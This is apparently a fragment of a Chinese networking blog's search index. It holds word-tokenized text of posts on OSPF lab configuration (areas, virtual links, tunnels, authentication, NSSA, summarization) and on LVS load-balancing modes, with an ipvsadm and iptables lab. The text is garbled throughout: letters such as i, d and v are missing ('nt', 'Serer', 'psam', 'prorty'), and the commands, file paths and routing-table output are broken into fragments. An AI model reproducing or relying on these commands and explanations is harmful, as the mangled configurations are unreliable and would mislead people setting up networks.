","rtual","-","lnk","4.4.4.4","R","3","router","ospf","1","area","1","rtual","-","lnk","2.2.2.2","这时候","，","R","3","和","R","2","建立","了","两个","邻居","关系","，","其中","一个","接口","用","的","是","OSPF","_","VL","0","#","查看","虚链路","show","p","ospf","rtual","-","lnks","HAMC","只","提供","完整性","和","可用性","，","不","提供","机密性","。","OSPF","分为","接口","和","区域","认证","，","但","都是","明文","加密","的","认证","和","RIP","&","amp",";","EIGRP","类似","。","OSPF","小","练习","区域","配置","R","{","1","~","4","}","：","area","0","R","{","3","-","5","}",",","R","{","4","-","6","}","：","area","1","R","{","3",",","4","}","的","环回","口","：","area","0","R","{","5",",","6","}","的","环回","口","：","area","1","R","{","5",",","6",",","7","}","：","area","2","优化","命令","enconf","tno","p","o","lolne","con","0","no","exec","-","tlogg","syn","R","1","ho","R","1","nt","e","00","p","a","192.168.12.1","255.255.255.0","no","shp","ospf","1","area","0","nt","e","01","p","a","192.168.23.1","255.255.255.0","no","shp","ospf","1","area","0","nt","e","02","p","a","192.168.184.1","255.255.255.0","no","shp","ospf","1","area","0","nt","lo","0","p","a","1.1.1.1","255.255.255.0","p","ospf","1","area","0","o","sh","p","nt","br","R","2","ho","R","2","nt","e","00","p","a","192.168.12.2","255.255.255.0","no","shp","ospf","1","area","0","nt","e","01","p","a","192.168.24.2","255.255.255.0","no","shp","ospf","1","area","0","nt","e","02","p","a","192.168.184.2","255.255.255.0","no","shp","ospf","1","area","0","nt","lo","0","p","a","2.2.2.2","255.255.255.0","p","ospf","1","area","0","o","sh","p","nt","br","R","3","ho","R","3","nt","e","00","p","a","192.168.13.3","255.255.255.0","no","shp","ospf","1","area","0","nt","e","01","p","a","192.168.35.3","255.255.255.0","no","shp","ospf","1","area","1","nt","e","02","p","a","192.168.184.3","255.255.255.0","no","shp","ospf","1","area","0","nt","lo","0","p","a","3.3.3.3","255.255.255.0","p","ospf","1","area","0","o","sh","p","nt","br","R","4","ho","R","4","nt","e","00","p","a","192.168.24.4","255.255.255.0","no","shp","ospf","1","area","0","nt","e","01","p","a","192.168.46.4","255.255.255.0","no","shp","ospf","1","area","1","nt","e","02","p","a","192.168.184.4","255.255.255.0","no","shp","ospf","1","area","0","nt","lo","0","p","a","4.4.4.4","255.255.255.0","p","ospf","1","area","0","o","sh","p","nt","br","R","5","ho","R","5","nt","e","00","p","a","192.168.35.5","255.255.255.0","no","shp","ospf","1","area","1","nt","e","01","p","a","192.168.57.5","255.255.255.0","no","shp","ospf","1","area","2","nt","lo","0","p","a","5.5.5.5","255.255.255.0","p","ospf","1","area","1","o","sh","p","nt","br","R","6","ho","R","6","nt","e","00","p","a","192.168.46.6","255.255.255.0","no","sh","p","ospf","1","area","1","nt","e","01","p","a","192.168.67.6","255.255.255.0","no","shp","ospf","1","area","2","nt","lo","0","p","a","6.6.6.6","255.255.255.0","p","ospf","1","area","1","o","sh","p","nt","br","R","7","ho","R","7","nt","e","00","p","a","192.168.57.7","255.255.255.0","no","shp","ospf","1","area","2","nt","e","01","p","a","192.168.67.7","255.255.255.0","no","shp","ospf","1","area","2","nt","lo","0","p","a","7.7.7.7","255.255.255.0","p","ospf","1","area","2","o","sh","p","nt","br","目前","来说","，","R","1","的","1.1.1.1","是","png","不通","R","7","的","7.7.7.7","的","，","因为","R","5","和","R","6","构","不成","边界","路由器","ABR","。","所以","需要","在","R","3","-","R","5","，","R","4","-","R","6","之间","构建","VPN","隧道","。","配置","隧道","R","3","nt","tun","0","tu","so","192.168.35.3","tu","e","192.168.35.5","p","a","172.16.35.3","255.255.255.0","p","ospf","1","area","0","R","5",":","nt","tun","0","tu","so","192.168.35.5","tu","e","192.168.35.3","p","a","172.16.35.5","255.255.255.0","p","ospf","1","area","0","R","4","nt","tun","0","tu","so","192.168.46.4","tu","e","192.168.46.6","p","a","172.16.46.4","255.255.255.0","p","ospf","1","area","0","R","6","nt","tun","0","tu","so","192.168.46.6","tu","e","192.168.46.4","p","a","172.16.46.6","255.255.255.0","p","ospf","1","area","0","当","虚","通道","建立","好的","时候","，","就","可","以","用","R","1","png","通","R","7","了","。","R","1","、","R","2","在","R","{","1","~","4","}","的","区域","中分","别","为","DR","和","BDR","R","1",":","nt","e","02","p","ospf","prorty","100","R","2",":","nt","e","02","p","ospf","prorty","90","之后","使用","o","clear","p","ospf","process","重置","ospf","的","进程","其余","的","链路","使用","P","2","P","网络","R","1",":","nt","range","e","00","-","2","p","ospf","net","pont","-","to","-","pontR","2",":","nt","range","e","00","-","1","p","ospf","net","pont","-","to","-","pontR","3",":","nt","range","e","00","-","1","p","ospf","net","pont","-","to","-","pontR","4",":","nt","range","e","00","-","1","p","ospf","net","pont","-","to","-","pontR","5","nt","range","e","00","-","1","p","ospf","net","pont","-","to","-","pontR","6","nt","range","e","00","-","1","p","ospf","net","pont","-","to","-","pontR","7","nt","range","e","00","-","1","p","ospf","net","pont","-","to","-","pont","默认","路由","注入","4","、","R","1",",","R","2","缺省","路由","R","1",":","nterface","Loopback","1","p","aress","100.1.1.1","255.255.255.0","p","ospf","1","area","0","router","ospf","1","efault","-","nformaton","orgnate","always","R","2",":","nterface","Loopback","1","p","aress","100.1.1.1","255.255.255.0","p","ospf","1","area","0","router","ospf","1","efault","-","nformaton","orgnate","always","metrc","10","metrc","-","度量","值","，","越","小","越优","特殊","区域","5","、","area","2","为","特殊","区域","R","5",":","router","ospf","1","area","2","nssa","no","-","summaryR","6",":","router","ospf","1","area","2","nssa","no","-","summaryR","7","router","ospf","1","restrbute","connecte","subnetsarea","2","nssa","!","!","!","OSPF","5","类","LSA","比","7","类","LSA","更","优先","没有","开启","nssa","之前","的","路由","表","：","O","*","E","2","0.0.0.00","[","11010","]","a","172.16.46.4",",","00",":","08",":","22",",","Tunnel","0","1.0.0.032","s","subnette",",","1","subnetsO","1.1.1.1","[","1101011","]","a","172.16.46.4",",","00",":","01",":","58",",","Tunnel","0","2.0.0.032","s","subnette",",","1","subnetsO","2.2.2.2","[","1101011","]","a","172.16.46.4",",","00",":","23",":","01",",","Tunnel","0","3.0.0.032","s","subnette",",","1","subnetsO","3.3.3.3","[","1101011","]","a","172.16.46.4",",","00",":","02",":","22",",","Tunnel","0","4.0.0.032","s","subnette",",","1","subnetsO","4.4.4.4","[","1101001","]","a","172.16.46.4",",","00",":","23",":","01",",","Tunnel","0","5.0.0.032","s","subnette",",","1","subnetsO","IA","5.5.5.5","[","1101021","]","a","172.16.46.4",",","00",":","02",":","22",",","Tunnel","0","6.0.0.08","s","arably","subnette",",","2","subnets",",","2","masksC","6.6.6.024","s","rectly","connecte",",","Loopback","0","L","6.6.6.632","s","rectly","connecte",",","Loopback","0","7.0.0.032","s","subnette",",","1","subnetsO","7.7.7.7","[","11011","]","a","192.168.67.7",",","00",":","42",":","06",",","Ethernet","01","100.0.0.032","s","subnette",",","1","subnetsO","100.1.1.1","[","1101011","]","a","172.16.46.4",",","00",":","01",":","58",",","Tunnel","0","172.16.0.016","s","arably","subnette",",","3","subnets",",","2","masksO","172.16.35.024","[","1102010","]","a","172.16.46.4",",","00",":","02",":","22",",","Tunnel","0","C","172.16.46.024","s","rectly","connecte",",","Tunnel","0","L","172.16.46.632","s","rectly","connecte",",","Tunnel","0","O","192.168.12.024","[","1101020","]","a","172.16.46.4",",","00",":","23",":","01",",","Tunnel","0","O","192.168.13.024","[","1101020","]","a","172.16.46.4",",","00",":","02",":","22",",","Tunnel","0","O","192.168.23.024","[","1101020","]","a","172.16.46.4",",","00",":","01",":","58",",","Tunnel","0","O","192.168.24.024","[","1101010","]","a","172.16.46.4",",","00",":","23",":","01",",","Tunnel","0","O","IA","192.168.35.024","[","1101020","]","a","172.16.46.4",",","00",":","02",":","22",",","Tunnel","0","192.168.46.024","s","arably","subnette",",","2","subnets",",","2","masksC","192.168.46.024","s","rectly","connecte",",","Ethernet","00","L","192.168.46.632","s","rectly","connecte",",","Ethernet","00","O","192.168.57.024","[","11020","]","a","192.168.67.7",",","00",":","42",":","06",",","Ethernet","01","192.168.67.024","s","arably","subnette",",","2","subnets",",","2","masksC","192.168.67.024","s","rectly","connecte",",","Ethernet","01","L","192.168.67.632","s","rectly","connecte",",","Ethernet","01","O","192.168.184.024","[","1101010","]","a","172.16.46.4",",","00",":","02",":","22",",","Tunnel","0","O","192.168.197.024","[","1101020","]","a","172.16.46.4",",","00",":","01",":","58",",","Tunnel","0","装完","NSSA","屏蔽","外部","路由","，","形成","一条","默认","路由","0.0.0.00","，","指向","R","5","和","R","6","O","*","IA","0.0.0.00","[","11011","]","a","192.168.67.6",",","00",":","00",":","05",",","Ethernet","01","[","11011","]","a","192.168.57.5",",","00",":","00",":","05",",","Ethernet","00","7.0.0.08","s","arably","subnette",",","2","subnets",",","2","masksC","7.7.7.024","s","rectly","connecte",",","Loopback","0","L","7.7.7.732","s","rectly","connecte",",","Loopback","0","192.168.57.024","s","arably","subnette",",","2","subnets",",","2","masksC","192.168.57.024","s","rectly","connecte",",","Ethernet","00","L","192.168.57.732","s","rectly","connecte",",","Ethernet","00","192.168.67.024","s","arably","subnette",",","2","subnets",",","2","masksC","192.168.67.024","s","rectly","connecte",",","Ethernet","01","L","192.168.67.732","s","rectly","connecte",",","Ethernet","01","路由","汇总","6","、","R","3","的","路由","汇总","R","3",":","=","=","=","=","=","=","$","这些","回环","接口","配置","的","p","地址","宣告","进","了","area","1","，","所以","在","area","1","中","汇总","nt","lo","1","p","a","172.16.1.1","255.255.255.0","nt","lo","2","p","a","172.16.2.1","255.255.255.0","nt","lo","3","p","a","172.16.3.1","255.255.255.0","nt","range","lo","1",",","lo","2",",","lo","3","p","ospf","1","area","1","router","ospf","1","area","1","range","172.16.0.0","255.255.0.0","R","5",":","=","=","=","=","=","=","router","ospf","1","area","1","range","172.16.0.0","255.255.0.0","R","2",":","=","=","=","=","=","=","router","ospf","1","area","1","range","172.16.0.0","255.255.0.0","Queston","？","：","为什么","R","1","读取","不到","R","3","的","172.16.0.016","的","条目","，","而","R","5","可以","读到","，","因为","R","3","和","R","5","有","一个","Tunnel","吗","？","在","汇总","之前","，","R","1","的","路由","表","172.16.0.016","s","arably","subnette",",","5","subnets",",","2","masksO","IA","172.16.1.132","[","11011","]","a","192.168.184.3",",","00",":","00",":","05",",","Ethernet","02","O","IA","172.16.2.132","[","11011","]","a","192.168.184.3",",","00",":","00",":","05",",","Ethernet","02","O","IA","172.16.3.132","[","11011","]","a","192.168.184.3",",","00",":","00",":","05",",","Ethernet","02","O","172.16.35.024","[","1101010","]","a","192.168.184.3",",","00",":","37",":","33",",","Ethernet","02","O","172.16.46.024","[","1101010","]","a","192.168.184.4",",","00",":","37",":","33",",","Ethernet","02","OSPF","认证","7","、","area","0","的","明文","认证","R","1","-","R","3",",","先","不","开启","R","4","的","明文","认证","router","ospf","1","area","0","authentcaton","#","注意","，","下面","的","所有","代码","都是","R","5","和","R","6","没有","添加","明文","认证","的","，","这里","添加","上","明文","认证","#","难关","area","0","学习","不到","7.7.7.0","的","路由","router","ospf","1","area","0","authentcaton","等到","40","s","死亡","计时","过","了","之后","，","就","会","发现","R","4","失效","：","*","Jan","1","03",":","13",":","17.836",":","%","OSPF","-","5","-","ADJCHG",":","Process","1",",","Nbr","2.2.2.2","on","Ethernet","00","from","FULL","to","DOWN",",","Neghbor","Down",":","Dea","tmer","expreR","4","(","confg",")","#","router","*","Jan","1","03",":","13",":","19.671",":","%","OSPF","-","5","-","ADJCHG",":","Process","1",",","Nbr","2.2.2.2","on","Ethernet","02","from","FULL","to","DOWN",",","Neghbor","Down",":","Dea","tmer","expreR","4","(","confg",")","#","router","ospf","1","R","4","(","confg","-","router",")","#","*","Jan","1","03",":","13",":","21.215",":","%","OSPF","-","5","-","ADJCHG",":","Process","1",",","Nbr","3.3.3.3","on","Ethernet","02","from","FULL","to","DOWN",",","Neghbor","Down",":","Dea","tmer","expre","一旦","在","R","4","上","开启","认证","，","R","4","又","会","重新","从","Down","变成","Full","R","4",":","router","ospf","1","area","0","authentcaton","R","3","-","5","，","R","4","-","6","密文","认证","R","3",":","nt","e","01","p","ospf","message","-","gest","-","key","1","m","5","cs","_","pap","ospf","authentcaton","message","-","gest","#","配置","完","之后","，","R","3","路由","表","中","，","R","5","的","Dea","Tme","会","跌","出","30","，","然后","直到","消失","，","这是","在","R","5","的","相应","接口","上","也","配置","认证",",","彼此","又","会","建立","相应","的","连接","。","nt","e","00","p","ospf","message","-","gest","-","key","1","m","5","cs","_","pap","ospf","authentcaton","message","-","gest","抑制","路由","8","、","禁止","area","2","内","的","路由","被","其他","区域","学到","R","5",":","=","=","=","=","=","router","ospf","1","area","1","range","192.168.57.0","255.255.255.0","not","-","aertsearea","1","range","192.168.67.0","255.255.255.0","not","-","aertsearea","2","nssa","translate","type","7","suppress","-","faR","6",":","=","=","=","=","=","router","ospf","1","area","1","range","192.168.57.0","255.255.255.0","not","-","aertsearea","1","range","192.168.67.0","255.255.255.0","not","-","aertsearea","2","nssa","translate","type","7","suppress","-","fa","OSPF","命令","配置","OSPF","协议","router","ospf","[","Process","_","ID","]","#","进程","ID","本地","有效","network","1.1.1.0","0.0.0.255","area","0","#","将","1.1.1.0","网段","(","包含","子网掩码",")","宣告","进","OSPF","网络","router","-","1.1.1.1","#","设置","Router","-","ID","，","注意","需要","重","启","生效","#","基于","链路","的","配置","nt","range","e","00","-","1","#","行","入","e","0","、","e","01","接口","p","ospf","1","area","0","#","将","该","接口","加入","OSPF","，","并且","按照","配置","的","子网掩码","宣告","其","接口","上","配置","OSPF","优先级","nt","e","00","p","ospf","prorty","10","#","默认","为","1","#","重置","OSPF","进程","，","重新","选举","o","clear","p","ospf","process","LSA","#","查看","1","类","LSAshow","p","ospf","atabase","router","x",".","x",".","x",".","x","#","查看","2","类","LSAshow","p","ospf","atabase","network","x",".","x",".","x",".","x","#","查看","3","类","LSAshow","p","ospf","atabase","summary","x",".","x",".","x",".","x","#","查看","4","类","LSAshow","p","ospf","atabase","asbr","-","summary","x",".","x",".","x",".","x","#","查看","5","类","LSAshow","p","ospf","atabase","external","x",".","x",".","x",".","x","#","查看","7","类","LSAshow","p","ospf","atabase","router","x",".","x",".","x",".","x"],"url":"http://ymlog.cn/2020/02/23/OSPF%E5%8D%8F%E8%AE%AE/","title":"OSPF协议","content":"OSPF距离矢量路由协议\n​    路由器相互之间只更新路由表信息，并且逐条更新，依照传闻的更新，任何一台路由器对路由表的更改，都将直接影响到下游。\n链路状态路由协议\n​    每台路由器都选择一个IP地址作为自己的名字，（Route...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E8%B7%AF%E7%94%B1%E6%8A%80%E6%9C%AF/","name":"路由技术"},"date":"2020-02-23 15:00:39"},{"word":["LVS","简介","在","已","有的","负载","均衡","技术","中","，","IP","负载","均衡","是","效率","最高的","。","它将","一组","服务器","构建","成","一个","高","性能","、","高","可用","的","虚拟","服务器","。","如","图","，","LVS","一共","有","以下","两","部分","组成","：","Loa","Balance","Machne","，","提供","调度","的","机器","，","负责","接收","用户","请求","后","转发","给","后端","Serer","集群","Real","Serer","，","真实的","服务器","集群","，","负责","提供","各种","服务","其","中","，","LB","机器","上","运行","LVS","，","LVS","有","用户","空间","和","内核","空间","两","部分","组成","：","IPVS","（","IP","Vrtual","Serer","）","：","工作","在","内核","空间","中","，","是","真正","生效","实现","调度","的","代码","。","psam","：","工作","在","用户","空间","，","负责","为","ps","内核","框架","编写","规则","，","定义","谁是","集群","，","谁是","后端","真实","服务器","。","LB","集群","原理","：","当","用户","的","请求","过","来时","，","会","直接","分发","到","Drector","Serer","上","，","然后","它","把","用户","请求","根据","设置","好的","调度","算法","，","智能","均衡","的","分配","到","后端","真正","的","服务器","上","（","Real","Serer","）","LVS","一共","有","三种","模式","，","分","别","是","：","Vrtual","Serer","a","Network","Aress","Translaton","（","VSNAT","）","Vrtual","Serer","a","IP","Tunnelng","（","VSTUN","）","Vrtual","Serer","a","Drect","Routng","（","VSDR","）","LVS","一共","有","8","中","调度","算法","轮询","（","Roun","Robn","）","调度","器","通过","”","轮","叫","”","调度","算法","将","外部","请求","按","顺序","轮流","分配","到","集群","中的","真实","服务器","上","，","它","均等地","对待","每一台","服务器","，","而","不管","服务器","上","实际","的","连接","数","和","系统","负载","。","加权","轮询","（","Weghte","Roun","Robn","）","调度","器","通过","”","加权","轮","叫","”","调度","算法","根据","真实","服务器","的","不同","处理","能力","来","调度","访问","请求","。","这样","可以","保证","处理","能力强","的","服务器","处理","更多","的","访问","流量","。","调度","器","可以","自动","问询","真实","服务器","的","负载","情况","，","并","动态","地","调整","其","权值","。","最少","链接","（","Least","Connectons","）","调度","器","通过","”","最少","连接","”","调度","算法","动态","地","将","网络","请求","调度","到","已","建立","的","链接","数","最少","的","服务器","上","。","如果","集群","系统","的","真实","服务器","具有","相近","的","系统","性能","，","采用","”","最小","连接","”","调度","算法","可以","较好","地","均衡","负载","。","加权","最少","链接","（","Weghte","Least","Connectons","）","在","集群","系统","中的","服务器","性能","差异","较大的","情况","下","，","调度","器","采用","”","加权","最少","链接","”","调度","算法","优化","负载","均衡","性能","，","具有","较","高权值","的","服务器","将","承受","较大","比例","的","活动","连接","负载","。","调度","器","可以","自动","问询","真实","服务器","的","负载","情况","，","并","动态","地","调整","其","权值","。","基于","局部性","的","最少","链接","（","Localty","-","Base","Least","Connectons","）","”","基于","局部性","的","最少","链接","”","调度","算法","是","针对","目标","IP","地址","的","负载","均衡","，","目前","主要","用于","Cache","集群","系统","。","该","算法","根据","请求","的","目标","IP","地址","找出","该","目标","IP","地址","最近","使用","的","服务器","，","若","该","服务器","是","可用","的","且","没有","超载","，","将","请求","发送","到","该","服务器","；","若","服务器","不存在","，","或者","该","服务器","超载","且","有","服务器","处于","一半","的","工作","负载","，","则用","”","最少","链接","”","的","原则","选出","一个","可用","的","服务","器","，","将","请求","发送","到","该","服务器","。","带","复制","的","基于","局部性","最少","链接","（","Localty","-","Base","Least","Connectons","wth","Replcaton","）","”","带","复制","的","基于","局部性","最少","链接","”","调度","算法","也是","针对","目标","IP","地址","的","负载","均衡","，","目前","主要","用于","Cache","集群","系统","。","它","与","LBLC","算法","的","不同之处","是","它","要","维护","从","一个","目标","IP","地址","到","一组","服务器","的","映射","，","而","LBLC","算法","维护","从","一个","目标","IP","地址","到","一台","服务器","的","映射","。","该","算法","根据","请求","的","目标","IP","地址","找出","该","目标","IP","地址","对应","的","服务","器组","，","按","”","最小","连接","”","原则","从","服务器","组","中选","出","一台","服务器","，","若","服务器","没有","超载","，","将","请求","发送","到","该","服务器","，","若","服务器","超载","；","则按","”","最小","连接","”","原则","从","这个","集群","中选","出","一","台","服务器","，","将","该","服务器","加入","到","服务器","组","中","，","将","请求","发送","到","该","服务器","。","同时","，","当","该","服务器","组","有一段时间","没有","被","修改","，","将","最","忙","的","服务器","从","服务器","组","中","删除","，","以","降低","复制","的","程度","。","目标","地址","散","列","（","Destnaton","Hashng","）","”","目标","地址","散","列","”","调度","算法","根据","请求","的","目标","IP","地址","，","作为","散","列","键","（","Hash","Key","）","从","静态","分配","的","散","列表","找出","对应","的","服务器","，","若","该","服务器","是","可用","的","且","未","超载","，","将","请求","发送","到","该","服务器","，","否则","返回","空","。","源地","址散","列","（","Source","Hashng","）","”","源地","址散","列","”","调度","算法","根据","请求","的","源","IP","地址","，","作为","散","列","键","（","Hash","Key","）","从","静态","分配","的","散","列表","找出","对应","的","服务器","，","若","该","服务器","是","可用","的","且","未","超载","，","将","请求","发送","到","该","服务器","，","否则","返回","空","。","最","短的","期望","的","延迟","？","最少","队列","调度","？","相关","术语","DS","：","Drector","Serer","。","指","的","是","前端","负载","均衡器","节点","。","RS","：","Real","Serer","。","后端","真实的","工作","服务器","。","VIP","：","向","外部","直接","面向","用户","请求","，","作为","用户","请求","的","目标","的","IP","地址","。","DIP","：","Drector","Serer","IP","，","主要","用于","和","内部","主机","通讯","的","IP","地址","。","RIP","：","Real","Serer","IP","，","后端","服务器","的","IP","地址","。","CIP","：","Clent","IP","，","访问","客户端","的","IP","地址","。","VSNAT","工作","模型","流程","：","当","用户","访问","服务器","提供","服务","时","，","发往","VIP","地址","的","请求","包","到达","LB","机器","LB","机器","检查","数据包","的","目标","IP","和","目标","Port","，","去","匹配","LVS","中的","规则","，","然后","根据","负载","均衡","算法","从","集群","中","选择","RS","响应","请求","，","并","将","连接","添加","到","记录","已","连接","的","Hash","表","中","将","数据包","的","目的","地址","和","端口","重","写","–","选中","的","RS","的","IP",":","Port","，","然后","转发","RS","。","RS","返回","数据","报时","，","SrcIP","：","RIP",".","Rport","DstIP","DIP",".","Dport","。","LB","机器","将","数据","报","中的","源","IP","地址","和源","Port","重","写","为","DS","的","源地","址","和源","Port","连接","终止","或","超时","后","，","连接","记录","就","会","在","已","连接","的","Hash","表","中","删除","特性","：","RS","应该","使用","私有","IP","地址","，","RS","的","网关","是","DIP","地址","DIP","要","和","RIP","属于","同一个","网段","请","求和","响应","报文","都","需要","经过","DS","（","性能","瓶颈","）","支持","端口","映射","RS","可以","使用","任意","操作系统","VSDR","工作","模型","流程","：","当","用户","访问","服务器","提供","服务","时","，","发往","VIP","地址","的","请求","包","到达","LB","机器","。","LB","机器","根据","负载","均衡","算法","，","选出","合适的","RS","，","将","目的","Mac","修改","为","RS","的","Mac","，","其余","不变","，","并","将","连接","记录","添加","到","Hash","表","。","RS","处理","完","报文","后","，","将","响应","报文","直接","发送","给","客户端","连接","终止","或","超时","后","，","连接","记录","就","会","在","已","连接","的","Hash","表","中","删除","数据","报","流动","：","非","ARP","接口","：","因为","DR","需要","所有","设备","在","同一个","局域网","内","，","而","arp","广","播","，","会","发送","LAN","的","所有","机器","（","LB","机器","和","RS","机器","）","，","我们","现在","只","需要","LB","机器","去","响应","VIP","请求","，","要求","只","能","是","DR","进行","响应","VIP","的","arp","请求","，","而","RS","不能","够","响应","。","我们","需要","设置","arp","参数","（","RS",")","，","限制","其","不能","响应","VIP","的","arp","请求","。","arp","_","gnore","：","arp","响应","arp","_","announce","：","arp","通告","特性","：","保证","前端","路由","将","目标","地址","为","VIP","报文","通通","发给","DS","RS","可以","使用","私有","IP","地址","，","也","可以","使用","公网","IP","地址","，","如果","使用","公网","地址","，","此时","通过","Internet","对","RIP","进行","直接","访问","RS","和","DS","必须","在","同一个","物理","网络","当中","请求","报文","经过","DS","到","RS","，","但是","响应","报文","不","经过","DS","（","消除","nat","模式","下","的","性能","瓶颈","）","不支持","地址","转化","，","也不","支持","端口映射","RS","的","网关","决不能","指向","DS","（","因为","我们","允许","RS","通过","DS","）","RS","上","的","lo","接口","配置","VIP","地址","VSTUN","工作","模型","流程","：","当","用户","访问","服务器","提供","服务","时","，","发往","VIP","地址","的","请求","包","到达","LB","机器","。","调度","器","根据","各个","服务器","的","负载","情况","，","动态","地","选择","一台","服务器","，","将","请求","报文","封装","在","另一个","IP","报文","中","，","再","将","封装","后","的","IP","报文","转发","给","选出","的","服务器","服务器","收到","报文","后","，","先","将","报文","解封","获得","原来","目标","地址","为","VIP","的","报文","，","服务器","发","现","VIP","地址","被","配置","在","本地","的","IP","隧道","设备","上","，","所以","就","处理","这个","请求","，","然后","根据","路由","表","将","响应","报文","直接","返回","给","客户","。","数据","报","流动","：","特点","：","TUN","的","建立","需要","时","动态","的","，","类似","DMVPN","因为","又","添加","了","IP","报头","，","所以","IP","隧道","会","消耗","一定","的","资源","不需要","DS","返回","响应","，","和","DR","类似","Tun","可以","做","加密","，","IPSec","等","三种","模型","的","比较","1",".","Vrtual","Serer","a","NAT","：","VSNAT","的","优点","是","服务器","可以","运行","任何","支持","TCPIP","的","操作系统","，","它","只","需要","一个","IP","地址","配置","在","调度","器","上","，","服务器","组","可以","用","私有","的","IP","地址","。","缺点","是","它","的","伸缩","能力","有限","，","因","为","在","VSNAT","中","请","求和","响应","报文","都","需要","通过","负载","调度","器","。","可以","有","三种","方法","解决","这个问题","：","混合","方法","、","VSTUN","和","VSDR","。","在","DNS","混合","集群","系统","中","，","有若","干","个","VSNAT","负载","调度","器","，","每个","负载","调度","器","带","自己","的","服务器","集群","，","同时","这些","负载","调度","器","又","通过","RR","-","DNS","组成","简","单","的","域名","。","但","VSTUN","和","VSDR","是","提高","系统","吞吐量","的","更好","方法","。","对于","那些","将","IP","地址","或者","端口","号","在","报文","数据","中","传送","的","网络服务","，","需要","编写","相应","的","应用","模块","来","转换","报文","数据","中的","IP","地址","或者","端口","号","。","这","会","带来","实现","的","工作量","，","同时","应用","模块","检查","报文","的","开销","会","降低","系统","的","吞吐","率","。","2",".","Vrtual","Serer","a","IP","Tunnelng","：","在","VSTUN","的","集群","系统","中","，","负载","调度","器","只","将","请求","调度","到","不同的","后端","服务器","，","后端","服务器","将","应答","的","数据","直接","返回","给","用户","。","这样","，","负载","调度","器","就","可以","处理","大量","的","请求","，","它","甚至","可以","调","度","百台","以上","的","服务器","（","同等","规模","的","服务器","）","，","而","它","不会","成为","系统","的","瓶颈","。","VSTUN","技术","对","服务器","有","要求","，","即","所有","的","服务器","必须","支持","“","IP","Tunnelng","”","或者","“","IP","Encapsulaton","”","协议","。","目前","，","VSTUN","的","后端","服务器","主要","运行","Lnux","操作系统","，","我们","没","对","其他","操作系统","进行","测试","。","因为","“","IP","Tunnelng","”","正","成为","各个","操作系统","的","标准","协议","，","所以","VSTUN","应","该会","适用","运行","其他","操作系统","的","后端","服务器","。","3",".","Vrtual","Serer","a","Drect","Routng","：","跟","VSTUN","方法","一样","，","VSDR","调度","器","只","处理","客户","到","服务器端","的","连接","，","响应","数据","可以","直接","从","独立的","网络","路由","返回","给","客户","。","这","可以","极大","地","提高","LVS","集群","系统","的","伸缩性","。","跟","VSTUN","相比","，","这种方法","没有","IP","隧道","的","开销","，","但是","要求","负载","调度","器","与","实际","服务器","都","有","一块","网卡","连","在","同一","物理","网段","上","，","服务器","网络设备","（","或者","设备","别名","）","不","作","ARP","响应","，","或者","能","将","报文","重","定向","（","Rerect","）","到","本地","的","Socket","端口","上","。","LVS","实验","1","、","LVSNAT","实验","配置","：","DS","LB","机器","地址","类型","IP","地址","VIP","192.168.1.105","DIP","192.168.70.10","RS","WEB","服务器","站点","IP","地址","默认","网关","RS","1","RIP","：","172.10.10.2016","GATEWAY","：","172.10.10.2","RS","2","RIP","：","172.10.10.3016","GATEWAY","：","172.10.10.2","DS","LB","机器","的","网卡","，","添加","了","一块","桥接","的","网卡","，","之后","访问","就","直接","访问","那","块","桥接","网卡","的","IP","地址","。","这样","真实的","IP","地址","就","不会","暴露","在","公网","了","。","eth","0",":","flags","=","4163","UP",",","BROADCAST",",","RUNNING",",","MULTICAST","mtu","1500","net","172.10.10.1","netmask","255.255.0.0","broacast","172.10.255.255","eth","1",":","flags","=","4163","UP",",","BROADCAST",",","RUNNING",",","MULTICAST","mtu","1500","net","192.168.1.2","netmask","255.255.255.0","broacast","192.168.1.255","RS","站点","部署","使用","http","服务","，","这里","介绍","以下","http","服务","，","主","配置","文件","：","etchttpconfhttp",".","conf","，","默认","站点","目录","：","arwwwhtml","。","需要","把","RS","机器","的","默认","网关","修改","为","DS","机器","的","IP","地址","#","noe","02","noe","03","yum","-","y","nstall","httpsystemctl","restart","httpecho","\"","THIS","IS","NODE","02","\"","arwwwhtmlnex",".","htmlse","-","'","GATEWAY","'","etcsysconfgnetwork","-","scrptsfcfg","-","ens","32","echo","\"","GATEWAY","=","192.168.70.10","\"","etcsysconfgnetwork","-","scrptsfcfg","-","ens","32","systemctl","restart","network","DS","站点","部署","#","安装","psam","，","ls","的","管理工具","yum","-","y","nstall","psam","#","打开","转发","配置","NAT","，","0","是","关闭","echo","\"","1","\"","procsysnetp","4","p","_","forwar","#","清除","Ptables","NAT","表","的","规则","ptables","-","t","nat","-","F","#","添加","ptables","规则","，","让","去往","ens","35","的","流量","转发","给","192.168.70.10","公网","-","-","私网","ptables","-","t","nat","-","A","POSTROUTING","-","s","192.168.70.1024","-","o","ens","35","-","j","MASQUERADE","#","清除","psam","的","所有","规则","psam","-","-","clear","#","设置","wrr","加权","轮询","策略","并","添加","主机","psam","-","A","-","t","192.168.1.105",":","80","-","s","wrr","#","添加","主机","，","将","到达","192.168.1.105","的","流量","转到","192.168.70.20","psam","-","a","-","t","192.168.1.105",":","80","-","r","192.168.70.20",":","80","-","m","-","w","2","#","添加","主机","，","将","到达","192.168.1.105","的","流量","转到","192.168.70.30","psam","-","a","-","t","192.168.1.105",":","80","-","r","192.168.70.30",":","80","-","m","-","w","1","#","psam","常用","选项","#","-","A",":","添加","Vrtual","Serer","Aress","（","VIP","+","Port","）","#","-","s",":","定义","负载","均衡","策略","#","-","e",":","修改","匹配","规则","#","-","r",":","指定","RS","的","地址","和","端口","#","-","m",":","指定","为","NAT","#","-","w",":","指定","权重","#","查看","策略","信息","psam","-","ln","之前","在","ocker","上","做","了","一遍","，","到","添加","虚拟","服务","地址","VSA","的","时候","报","错","了","，","大概","是","LVS","是","要","通过","LINUX","内核","来","实现","，","ocker","下","完成","不了","对","内核","的","改动","，","所以","用","不了","。","[","root","@","00564133","a","53","]","#","suo","psam","-","A","-","t","192.168.1.2",":","80","-","s","wrrCan","'","t","ntalze","ps",":","Protocol","not","aalableAre","you","sure","that","IP","Vrtual","Serer","s","bult","n","the","kernel","or","as","moule","?","2","、","LVSDR","环境","准备","：","DS","LB","机器","地址","类型","IP","地址","VIP","192.168.70.100","DIP","192.168.70.10","RS","WEB","服务器","站点","IP","地址","VIP","地址","RS","1","RIP","：","192.168.70.20","192.168.70.100","lo","RS","2","RIP","：","192.168.70.30","192.168.70.100","lo","RS","部署","#","!","bnbash","#","不能","让","Gateway","指向","noe","1","se","-","'","GATEWAY","'","etcsysconfgnetwork","-","scrptsfcfg","-","ens","32","se","-","'","^"